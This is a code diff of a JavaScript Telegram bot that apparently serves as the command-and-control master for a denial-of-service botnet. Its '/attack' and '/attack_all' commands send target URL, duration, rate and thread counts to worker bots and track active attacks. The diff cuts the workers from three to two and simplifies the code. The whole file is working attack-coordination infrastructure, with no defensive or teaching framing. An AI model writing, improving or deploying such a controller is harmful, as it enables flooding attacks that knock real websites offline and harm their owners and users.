@@ -7,16 +7,13 @@ dotenv.config();
 const MASTER_TOKEN = process.env.MASTER_BOT_TOKEN;
 const ADMIN_ID = '6247762383';
 
-// Worker bot API URLs (Railway will provide these)
+// Only 2 workers now
 const WORKERS = [
-    { name: 'worker1', url: process.env.WORKER1_URL, enabled: true, busy: false },
-    { name: 'worker2', url: process.env.WORKER2_URL, enabled: true, busy: false },
-    { name: 'worker3', url: process.env.WORKER3_URL, enabled: true, busy: false }
+    { name: 'worker1', token: process.env.WORKER1_TOKEN, enabled: true, busy: false },
+    { name: 'worker2', token: process.env.WORKER2_TOKEN, enabled: true, busy: false }
 ];
 
 const bot = new Telegraf(MASTER_TOKEN);
-
-// Track active attacks
 const activeAttacks = new Map();
 
 bot.start((ctx) => {
@@ -24,20 +21,18 @@ bot.start((ctx) => {
     
     const available = WORKERS.filter(w => w.enabled && !w.busy).length;
     ctx.reply(
-        `🔥 *MASTER CONTROL*\n\n` +
+        `🔥 MASTER CONTROL\n\n` +
         `Workers: ${WORKERS.length}\n` +
         `Available: ${available}\n\n` +
-        `*Commands:*\n` +
-        `/attack <url> <time> <rate> <threads> - Auto-assign to worker\n` +
-        `/attack_all <url> <time> <rate> <threads> - Use all workers\n` +
-        `/status - Worker status\n` +
-        `/enable <worker> - Enable worker\n` +
-        `/disable <worker> - Disable worker`,
-        { parse_mode: 'Markdown' }
+        `Commands:\n` +
+        `/attack <url> <time> <rate> <threads>\n` +
+        `/attack_all <url> <time> <rate> <threads>\n` +
+        `/status\n` +
+        `/enable <worker>\n` +
+        `/disable <worker>`
     );
 });
 
-// Auto-assign to available worker
 bot.command('attack', async (ctx) => {
     if (ctx.from.id.toString() !== ADMIN_ID) return;
 
@@ -48,7 +43,6 @@ bot.command('attack', async (ctx) => {
         return ctx.reply('❌ Usage: /attack <url> <time> <rate> <threads>');
     }
 
-    // Find available worker
     const worker = WORKERS.find(w => w.enabled && !w.busy);
     if (!worker) {
         return ctx.reply('⚠️ No workers available');
@@ -60,8 +54,7 @@ bot.command('attack', async (ctx) => {
     ctx.reply(`🔄 Assigning to ${worker.name} (ID: ${attackId})`);
 
     try {
-        // Send command to worker via Telegram API
-        await axios.post(`https://api.telegram.org/bot${process.env[`WORKER${worker.name.slice(-1)}_TOKEN`]}/sendMessage`, {
+        await axios.post(`https://api.telegram.org/bot${worker.token}/sendMessage`, {
             chat_id: ADMIN_ID,
             text: `/attack ${url} ${time} ${rate} ${threads} ${attackId}`
         });
@@ -72,7 +65,6 @@ bot.command('attack', async (ctx) => {
             url
         });
 
-        // Release worker after estimated time
         setTimeout(() => {
             worker.busy = false;
             activeAttacks.delete(attackId);
@@ -84,7 +76,6 @@ bot.command('attack', async (ctx) => {
     }
 });
 
-// Attack with ALL workers
 bot.command('attack_all', async (ctx) => {
     if (ctx.from.id.toString() !== ADMIN_ID) return;
 
@@ -108,7 +99,7 @@ bot.command('attack_all', async (ctx) => {
         worker.busy = true;
 
         try {
-            await axios.post(`https://api.telegram.org/bot${process.env[`WORKER${worker.name.slice(-1)}_TOKEN`]}/sendMessage`, {
+            await axios.post(`https://api.telegram.org/bot${worker.token}/sendMessage`, {
                 chat_id: ADMIN_ID,
                 text: `/attack ${url} ${time} ${rate} ${threads} ${attackId}`
             });
@@ -120,8 +111,6 @@ bot.command('attack_all', async (ctx) => {
             });
 
             launched++;
-            
-            // Small delay between workers
             await new Promise(r => setTimeout(r, 1000));
 
         } catch (error) {
@@ -133,24 +122,21 @@ bot.command('attack_all', async (ctx) => {
     ctx.reply(`✅ Launched ${launched} attacks`);
 });
 
-// Status command
 bot.command('status', (ctx) => {
     if (ctx.from.id.toString() !== ADMIN_ID) return;
 
-    let status = '📊 *WORKER STATUS*\n\n';
+    let status = '📊 WORKER STATUS\n\n';
     
     WORKERS.forEach(w => {
         const icon = w.enabled ? (w.busy ? '🟡' : '🟢') : '🔴';
-        status += `${icon} *${w.name}*\n`;
-        status += `  Status: ${w.busy ? 'Busy' : 'Ready'}\n`;
-        status += `  URL: ${w.url || 'Not set'}\n\n`;
+        status += `${icon} ${w.name}\n`;
+        status += `  Status: ${w.busy ? 'Busy' : 'Ready'}\n\n`;
     });
 
     status += `Active Attacks: ${activeAttacks.size}`;
-    ctx.reply(status, { parse_mode: 'Markdown' });
+    ctx.reply(status);
 });
 
-// Enable/disable workers
 bot.command('enable', (ctx) => {
     if (ctx.from.id.toString() !== ADMIN_ID) return;
     const workerName = ctx.message.text.split(' ')[1];
@@ -173,3 +159,4 @@ bot.command('disable', (ctx) => {
 });
 
 bot.launch();
+console.log('✅ Master bot started with 2 workers');
